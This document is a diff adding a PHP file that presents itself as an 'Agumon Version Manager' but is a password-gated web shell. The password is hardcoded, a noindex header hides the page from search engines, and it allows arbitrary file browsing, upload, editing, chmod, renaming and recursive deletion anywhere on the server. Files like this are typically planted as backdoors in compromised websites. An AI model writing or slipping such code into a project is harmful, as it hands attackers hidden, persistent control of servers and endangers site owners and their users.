@@ -1,0 +1,194 @@
+<?php
+session_start();
+header("X-Robots-Tag: noindex, nofollow", true);
+
+
+
+$password_akses = "Pemuda*Pancasila-HackeRr"; 
+
+
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: ?");
+    exit;
+}
+
+if (isset($_POST['login_pass'])) {
+    if ($_POST['login_pass'] === $password_akses) {
+        $_SESSION['authenticated'] = true;
+    } else {
+        $login_error = "Password salah!";
+    }
+}
+
+if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
+    ?>
+    <!DOCTYPE html>
+    <html><head><title>Login System</title><style>body{font-family:sans-serif;background:#0d1117;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#161b22;padding:30px;border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,0.5);width:320px;text-align:center;color:#c9d1d9;border:1px solid #30363d}input{width:100%;padding:12px;margin:15px 0;border:1px solid #30363d;background:#0d1117;color:#fff;border-radius:6px;box-sizing:border-box}button{width:100%;padding:12px;background:#238636;color:#fff;border:none;border-radius:6px;cursor:pointer;font-weight:bold;width:100%}</style></head>
+    <body><div class="box"><h2>🔒 Login</h2><?php if(isset($login_error)) echo "<p style='color:#f85149'>$login_error</p>"; ?><form method="POST"><input type="password" name="login_pass" placeholder="Enter Password" required><button type="submit">Unlock</button></form></div></body></html>
+    <?php exit;
+}
+
+// --- FUNGSI HAPUS REKURSIF (Hapus Folder & Isinya) ---
+function full_rmdir($target) {
+    if (is_dir($target)) {
+        $files = glob($target . '*', GLOB_MARK); 
+        foreach ($files as $file) {
+            full_rmdir($file);
+        }
+        return @rmdir($target);
+    } elseif (is_file($target)) {
+        return @unlink($target);
+    }
+    return false;
+}
+
+$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
+if (!is_dir($dir)) { $dir = getcwd(); }
+$dir = realpath($dir); 
+$message = '';
+
+// --- LOGIKA AKSI ---
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
+    $action = $_POST['action'];
+    if ($action === 'rename') {
+        $old = $_POST['old_path'];
+        $new = dirname($old) . DIRECTORY_SEPARATOR . $_POST['new_name'];
+        if (@rename($old, $new)) $message = "Berhasil diubah!"; 
+    } elseif ($action === 'delete') {
+        if(@unlink($_POST['file'])) $message = "File berhasil dihapus.";
+    } elseif ($action === 'mkdir') {
+        if(@mkdir($dir . DIRECTORY_SEPARATOR . $_POST['dirname'])) $message = "Folder dibuat.";
+    } elseif ($action === 'save') {
+        if(@file_put_contents($_POST['file'], $_POST['content']) !== false) $message = "Simpan berhasil.";
+    } elseif ($action === 'rmdir') {
+        // Menggunakan fungsi rekursif baru
+        if(full_rmdir($_POST['folder'])) $message = "Folder dan seluruh isinya berhasil dihapus!";
+        else $message = "Gagal menghapus folder (Cek Permission).";
+    } elseif ($action === 'chmod') {
+        if(@chmod($_POST['path'], octdec($_POST['perm']))) $message = "Permission diubah.";
+    }
+}
+
+if (isset($_FILES['upload'])) {
+    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dir . DIRECTORY_SEPARATOR . $_FILES['upload']['name'])) {
+        $message = "Upload Berhasil.";
+    }
+}
+
+$files = scandir($dir);
+function get_perms($p) { return substr(sprintf('%o', fileperms($p)), -4); }
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Agumon Version Manager</title>
+    <style>
+        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --text: #c9d1d9; --blue: #58a6ff; --green: #238636; --red: #f85149; --hover: #21262d; }
+        body { font-family: 'Segoe UI', sans-serif; margin:20px; background: var(--bg); color: var(--text); }
+        .card { background: var(--card); border: 1px solid var(--border); border-radius:8px; padding:15px; margin-bottom:15px; }
+        .btn { padding:6px 12px; border:1px solid var(--border); background: var(--hover); cursor:pointer; text-decoration:none; color: var(--text); font-size:12px; border-radius:6px; transition: 0.2s; }
+        .btn:hover { background: #30363d; }
+        .btn-blue { background: var(--blue); color: #fff; border: none; }
+        .btn-red { background: transparent; color: var(--red); border: 1px solid var(--red); }
+        .btn-red:hover { background: var(--red); color: #fff; }
+        ul { list-style:none; padding:0; margin:0; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+        li { display:flex; justify-content:space-between; padding:12px 15px; align-items:center; border-bottom: 1px solid var(--border); }
+        li:hover { background: var(--hover); border-left: 4px solid var(--blue); padding-left: 11px; }
+        input[type="text"] { background: var(--bg); border: 1px solid var(--border); color: #fff; padding: 8px; border-radius: 6px; }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: flex; justify-content: center; align-items: center; z-index: 1000; }
+        .modal-content { background: var(--card); width: 95%; max-width: 1050px; border-radius: 12px; padding: 25px; border: 1px solid var(--border); }
+        textarea { width: 100%; height: 68vh; background: #010409; color: #a5d6ff; font-family: 'Consolas', monospace; padding: 15px; border: 1px solid var(--border); border-radius: 8px; resize: none; font-size: 14px; box-sizing: border-box; }
+    </style>
+    <script>
+        function sendPost(obj) {
+            let f = document.createElement("form"); f.method = "POST";
+            for(let k in obj) { let i = document.createElement("input"); i.type="hidden"; i.name=k; i.value=obj[k]; f.appendChild(i); }
+            document.body.appendChild(f); f.submit();
+        }
+        function doRename(p, n) { let name = prompt("Ganti nama:", n); if(name) sendPost({action:'rename', old_path:p, new_name:name}); }
+        function doChmod(p, v, n) { let perm = prompt("Permission baru:", v); if(perm) sendPost({action:'chmod', path:p, perm:perm}); }
+        function confirmDel(n, isDir) { 
+            let warning = isDir ? "\nPERINGATAN: Semua file di dalam folder ini juga akan terhapus!" : "";
+            return confirm("Hapus " + (isDir ? "folder" : "file") + ": " + n + "?" + warning); 
+        }
+    </script>
+</head>
+<body>
+
+<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+    <h2 style="color: var(--blue); margin:0;">📁 Agumon Version Manager <span style="font-size:12px; opacity:0.5;">Version 1.0</span></h2>
+    <a href="?logout=1" class="btn btn-red">LOGOUT</a>
+</div>
+
+<div class="card">
+    <form method="GET" style="display:flex; gap:10px;">
+        <input type="text" name="dir" value="<?php echo htmlspecialchars($dir); ?>" style="flex-grow:1;">
+        <button type="submit" class="btn btn-blue">GO</button>
+    </form>
+    <div style="margin-top:10px;"><a class="btn" href="?dir=<?php echo urlencode(dirname($dir)); ?>">⬆️ Back</a></div>
+</div>
+
+<?php if ($message) echo "<div class='card' style='color:#7ee787;'>● $message</div>"; ?>
+
+<div class="card" style="display:flex; gap:20px;">
+    <form method="POST" enctype="multipart/form-data">Upload: <input type="file" name="upload"> <button class="btn btn-blue" type="submit">Upload</button></form>
+    <form method="POST">Folder: <input type="text" name="dirname"> <button class="btn" name="action" value="mkdir">Create</button></form>
+</div>
+
+<div class="card" style="padding:0;">
+    <ul>
+    <?php foreach ($files as $f) {
+        if ($f === '.' || $f === '..') continue;
+        $fullPath = $dir . DIRECTORY_SEPARATOR . $f;
+        $isDir = is_dir($fullPath);
+        $currentPerm = get_perms($fullPath);
+        ?>
+        <li>
+            <span><?php echo $isDir ? "📂" : "📄"; ?> 
+                <?php if ($isDir): ?><a href="?dir=<?php echo urlencode($fullPath); ?>" style="color: var(--blue); text-decoration:none;"><?php echo $f; ?></a>
+                <?php else: ?><span><?php echo $f; ?></span><?php endif; ?>
+            </span>
+            <div style="display:flex; gap:8px;">
+                <span style="font-size:11px; opacity:0.6;">[<?php echo $currentPerm; ?>]</span>
+                <button class="btn" onclick="doChmod('<?php echo addslashes($fullPath); ?>', '<?php echo $currentPerm; ?>', '<?php echo $f; ?>')">Perm</button>
+                <button class="btn" onclick="doRename('<?php echo addslashes($fullPath); ?>', '<?php echo addslashes($f); ?>')">Rename</button>
+                <?php if (!$isDir): ?>
+                    <a class="btn" href="?dir=<?php echo urlencode($dir); ?>&edit=<?php echo urlencode($fullPath); ?>">Edit</a>
+                    <form method="POST" style="display:inline;"><input type="hidden" name="file" value="<?php echo $fullPath; ?>"><button class="btn btn-red" name="action" value="delete" onclick="return confirmDel('<?php echo addslashes($f); ?>', false)">Del</button></form>
+                <?php else: ?>
+                    <form method="POST" style="display:inline;"><input type="hidden" name="folder" value="<?php echo $fullPath; ?>"><button class="btn btn-red" name="action" value="rmdir" onclick="return confirmDel('<?php echo addslashes($f); ?>', true)">Del</button></form>
+                <?php endif; ?>
+            </div>
+        </li>
+    <?php } ?>
+    </ul>
+</div>
+
+<?php if (isset($_GET['edit'])): 
+    $editPath = $_GET['edit'];
+    if (file_exists($editPath)) {
+        $content = @file_get_contents($editPath);
+        // FIX: Supaya file aneh/Zend tetap muncul isinya (tidak blank)
+        $displayContent = htmlspecialchars($content, ENT_QUOTES | ENT_SUBSTITUTE, 'ISO-8859-1');
+?>
+<div class="modal-overlay">
+    <div class="modal-content">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+            <h3 style="margin:0; color: var(--blue);">📝 Editing: <?php echo basename($editPath); ?></h3>
+            <a href="?dir=<?php echo urlencode($dir); ?>" style="color:white; text-decoration:none; font-size:24px;">&times;</a>
+        </div>
+        <form method="POST">
+            <input type="hidden" name="file" value="<?php echo $editPath; ?>"><input type="hidden" name="action" value="save">
+            <textarea name="content"><?php echo $displayContent; ?></textarea>
+            <div style="margin-top:20px; display:flex; justify-content: flex-end; gap:10px;">
+                <a href="?dir=<?php echo urlencode($dir); ?>" class="btn">BATAL</a>
+                <button type="submit" class="btn btn-blue" style="padding:10px 30px;">SIMPAN</button>
+            </div>
+        </form>
+    </div>
+</div>
+<?php } endif; ?>
+</body>
+</html>
